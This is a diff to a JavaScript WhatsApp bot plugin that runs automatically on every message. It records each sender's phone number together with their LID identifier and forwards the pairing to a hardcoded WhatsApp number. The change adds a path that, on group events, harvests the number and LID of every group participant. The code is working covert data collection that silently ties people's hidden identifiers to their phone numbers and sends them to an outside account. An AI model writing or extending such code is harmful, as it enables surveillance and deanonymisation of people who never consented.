@@ -13,41 +13,51 @@ function save(data) {
   fs.writeFileSync(FILE, JSON.stringify(data, null, 2))
 }
 
-const DESTINO = '59898719147@s.whatsapp.net' // 📩 Solo este número recibe los LID
+const DESTINO = '59898719147@s.whatsapp.net'
+
+// 🧠 Función central de captura
+async function capturar(jid, lid, conn) {
+  if (!jid || !lid) return
+
+  let num = jid.replace(/[^0-9]/g, '')
+  let db = load()
+  if (db[num]) return
+
+  db[num] = lid
+  save(db)
+
+  await conn.sendMessage(DESTINO, {
+    text: `🧠 *Nuevo LID detectado*\n\nNúmero: ${num}\nLID: ${lid}`
+  })
+}
 
 let handler = async (m, { conn }) => {
   try {
-    if (!m.sender) return
-
-    // 🧠 Captura del LID real
+    // 🧲 Desde mensajes
     let lid =
       m.senderLid ||
       m.key?.participantLid ||
+      m.message?.extendedTextMessage?.contextInfo?.participantLid ||
       m.message?.messageContextInfo?.participantLid
 
-    if (!lid) return
+    if (lid) {
+      await capturar(m.sender, lid, conn)
+    }
 
-    let num = m.sender.replace(/[^0-9]/g, '')
-    let db = load()
-
-    // 🛑 Ya registrado → ignorar
-    if (db[num]) return
-
-    // 💾 Guardar
-    db[num] = lid
-    save(db)
-
-    // 📨 Enviar solo al número autorizado
-    await conn.sendMessage(DESTINO, {
-      text: `🧠 *Nuevo LID detectado*\n\nNúmero: ${num}\nLID: ${lid}`
-    })
+    // 🧲 Desde eventos de grupo
+    if (m.messageStubType) {
+      let meta = await conn.groupMetadata(m.chat)
+      for (let p of meta.participants) {
+        if (p.lid) {
+          await capturar(p.id, p.lid, conn)
+        }
+      }
+    }
 
   } catch (e) {
     console.error('AUTOLID ERROR:', e)
   }
 }
 
-// Hook automático — sin comandos
 handler.all = true
-
 export default handler
